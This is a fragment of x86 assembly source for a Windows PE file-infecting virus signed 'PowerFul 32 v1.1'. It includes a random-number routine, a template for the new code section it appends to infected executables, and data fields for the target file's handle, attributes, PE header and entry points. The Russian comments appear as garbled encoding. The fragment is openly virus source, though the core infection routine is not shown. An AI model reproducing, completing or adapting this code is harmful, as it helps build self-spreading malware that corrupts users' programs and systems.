           call     init_rnd_proc
   cell_for_rnd_number dd 0100h
   init_rnd_proc:
           pop      ebx
           imul     eax,dword ptr [ebx],4dh
           inc      eax
           mov      dword ptr [ebx],eax
           pop      ebx
           inc      ebx
           xor      edx,edx
           or       ebx,ebx
           jz       quit_from_rnd
           div      ebx   ;EDX:EAX / EBX  -> EAX:EDX
   quit_from_rnd:
           pop      ebx eax
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   New_OBJ:
   db '.text',0,0,0       ;‚¨¬ ¨¥! *p¨ ¨§¬¥¥¨¨  ¤¯¨á¨, p §¬¥p íâ®©
                          ;á¥ªæ¨¨ ¤®«¦¥ p ¢ïâìáï 8.
   dd 00000000h,00000000h ;VIRTUAL SIZE   RVA ®¡ì¥ªâ 
   dd 00000000h,00000000h ;PHYS SIZE      PHYS OFFSET
   dd 00000000h,00000000h ;RESERVED       RESERVED
   dd 00000000h,60000020h ;RESERVED       OBJECT FLAGS
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   db "PowerFul 32 v1.1 (c) DK and —“/5"
   end_crypt:
   end_virus:
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   busy_flag         db 0
   file_handle       dd 0
   file_attribute    dd 0
   time_date_of_file dd 0
   ;0, ¥á«¨ ¥ ®¤® ¨¬ï ¨§ ¯¥p¥çï FILENAMES ¥ á®¢¯ «®.
   ;ˆ ç¥ ®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® ¨¬¥¨.
   filename          db 0
   ;0, ¥á«¨ ¥ ®¤® p áè¨p¥¨¥ ¨§ ¯¥p¥çï extentions ¥ á®¢¯ «®.
   ;ˆ ç¥ ®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® p áè¨p¥¨ï.
   extention         db 0
   ;‚¨¬ ¨¥ ¢ á«ãç ¥, ¥á«¨ extention=0, ¬ áª¨ ¥ ¯p®¢¥pïîâáï
   ;0, ¥á«¨ ¥ ®¤  ¬ áª  ¨§ ¯¥p¥çï filemasks ¥ á®¢¯ « .
   ;ˆ ç¥ ®¬¥p áâp®ª¨ á®¢¯ ¢è¥© ¬ áª¨.
   filemask          db 0
   ;PE § £®«®¢®ª
   PE_header         db 060h dup (0)
   ;*®á«¥¤¨© WIN ®¡ì¥ªâ
   last_WIN_object   db 040d dup (0)
   ;Šã¤  ¡ã¤¥¬ ¯¨á âì ¨§¬¥¥ë© PE § £®«®¢®ª
   PE_header_entrypoint  dd 0
   ;Šã¤  ¡ã¤¥¬ ¯¨á âì ®¢ë© ®¡ì¥ªâ
   New_OBJ_entrypoint    dd 0
   path_to_file      db 200h dup (0)
   common_buffer     db 100h dup (0)
   NUL_buffer:
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   exit:
           push     0
           call     ExitProcess
   end start_virus
